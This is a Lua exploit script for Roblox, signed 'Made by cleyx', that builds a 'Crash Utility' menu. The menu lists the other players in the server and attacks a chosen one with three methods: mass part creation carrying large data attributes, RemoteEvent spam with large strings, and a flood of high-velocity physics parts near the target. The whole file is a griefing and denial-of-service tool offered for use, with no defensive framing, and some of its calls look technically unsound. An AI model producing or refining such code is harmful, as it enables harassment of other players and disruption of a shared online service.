-- Roblox Client-Side Crash Utility
-- Signature: Made by cleyx

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")

-- Create GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "CrashUtility"
ScreenGui.Parent = CoreGui or LocalPlayer:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 300, 0, 200)
Frame.Position = UDim2.new(0.5, -150, 0.5, -100)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.BorderSizePixel = 0
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "Crash Utility"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16
Title.Parent = Frame

local PlayerList = Instance.new("ScrollingFrame")
PlayerList.Size = UDim2.new(1, -10, 0, 120)
PlayerList.Position = UDim2.new(0, 5, 0, 35)
PlayerList.BackgroundTransparency = 1
PlayerList.ScrollBarThickness = 4
PlayerList.Parent = Frame

local CrashButton = Instance.new("TextButton")
CrashButton.Size = UDim2.new(1, -10, 0, 30)
CrashButton.Position = UDim2.new(0, 5, 1, -35)
CrashButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
CrashButton.Text = "CRASH TARGET"
CrashButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CrashButton.Font = Enum.Font.GothamBold
CrashButton.TextSize = 14
CrashButton.Parent = Frame

local Signature = Instance.new("TextLabel")
Signature.Size = UDim2.new(1, 0, 0, 15)
Signature.Position = UDim2.new(0, 0, 1, -15)
Signature.BackgroundTransparency = 1
Signature.Text = "Made by cleyx"
Signature.TextColor3 = Color3.fromRGB(150, 150, 150)
Signature.Font = Enum.Font.Gotham
Signature.TextSize = 10
Signature.Parent = Frame

local SelectedPlayer = nil

-- Populate player list
local function UpdatePlayerList()
    for _, child in pairs(PlayerList:GetChildren()) do
        if child:IsA("TextButton") then
            child:Destroy()
        end
    end
    
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local Button = Instance.new("TextButton")
            Button.Size = UDim2.new(1, -10, 0, 20)
            Button.BackgroundTransparency = 1
            Button.Text = player.Name
            Button.TextColor3 = Color3.fromRGB(200, 200, 200)
            Button.Font = Enum.Font.Gotham
            Button.TextSize = 12
            Button.TextXAlignment = Enum.TextXAlignment.Left
            Button.Parent = PlayerList
            
            Button.MouseButton1Click:Connect(function()
                SelectedPlayer = player
                CrashButton.Text = "CRASH: " .. player.Name
                CrashButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
            end)
        end
    end
end

Players.PlayerAdded:Connect(UpdatePlayerList)
Players.PlayerRemoving:Connect(UpdatePlayerList)
UpdatePlayerList()

-- Crash methods
local function CrashTarget(player)
    if not player or not player.Character then return end
    
    -- Method 1: Infinite property assignment (memory leak)
    spawn(function()
        local targetChar = player.Character
        if not targetChar then return end
        
        for i = 1, 10000 do
            local Part = Instance.new("Part")
            Part.Parent = Workspace
            Part.Anchored = true
            Part.CanCollide = false
            Part.Transparency = 1
            Part.Position = targetChar.HumanoidRootPart.Position + Vector3.new(math.random(-100, 100), math.random(-100, 100), math.random(-100, 100))
            
            -- Create massive table attachment
            local Data = {}
            for j = 1, 1000 do
                table.insert(Data, string.rep("A", 1000))
            end
            Part:SetAttribute("CrashData", Data)
            
            wait()
        end
    end)
    
    -- Method 2: Remote event spam (if accessible)
    spawn(function()
        for i = 1, 5000 do
            pcall(function()
                local Remote = Instance.new("RemoteEvent")
                Remote.Name = "Crash_" .. tostring(i)
                Remote.Parent = player
                Remote:FireServer(string.rep("B", 10000))
            end)
            wait()
        end
    end)
    
    -- Method 3: Physics overload near target
    spawn(function()
        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        if not root then return end
        
        for i = 1, 500 do
            local Part = Instance.new("Part")
            Part.Size = Vector3.new(0.1, 0.1, 0.1)
            Part.Anchored = false
            Part.CanCollide = true
            Part.Position = root.Position + Vector3.new(math.random(-5, 5), math.random(-5, 5), math.random(-5, 5))
            Part.Parent = Workspace
            
            local Velocity = Instance.new("BodyVelocity")
            Velocity.Velocity = Vector3.new(math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000))
            Velocity.MaxForce = Vector3.new(1000000, 1000000, 1000000)
            Velocity.Parent = Part
            
            wait()
        end
    end)
end

CrashButton.MouseButton1Click:Connect(function()
    if SelectedPlayer then
        CrashButton.Text = "CRASHING..."
        CrashButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
        CrashTarget(SelectedPlayer)
        wait(2)
        CrashButton.Text = "CRASH: " .. SelectedPlayer.Name
        CrashButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    end
end)
